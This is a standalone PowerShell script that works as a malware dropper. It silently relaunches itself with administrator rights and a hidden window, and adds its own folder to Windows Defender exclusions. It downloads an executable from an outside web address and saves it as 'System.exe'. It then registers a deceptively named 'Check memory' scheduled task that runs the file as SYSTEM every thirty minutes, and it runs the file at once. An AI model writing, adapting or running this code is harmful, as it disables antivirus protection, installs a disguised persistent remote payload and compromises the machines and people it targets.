if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arg = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Definition + "`""
    Start-Process -FilePath "powershell" -ArgumentList $arg -Verb RunAs
    exit
}

$pathToExclude = if ($PSScriptRoot -and $PSScriptRoot -ne "") { $PSScriptRoot } else { (Get-Location).Path }

try {
    Add-MpPreference -ExclusionPath $pathToExclude
    $Url = "https://my-nextjs-app-8r12.vercel.app/api/download?file=Client.exe"
    $file = "System.exe"
    $full = Join-Path -Path $pathToExclude -ChildPath $file
    Invoke-WebRequest -Uri $Url -OutFile $full
    $taskName = "Check memory"
    $taskDescription = "Periodic memory check task"
    $action = New-ScheduledTaskAction -Execute $full
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration (New-TimeSpan -Days 9999)
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description $taskDescription
    . $full
    exit(0)
} catch {
	exit(0)
}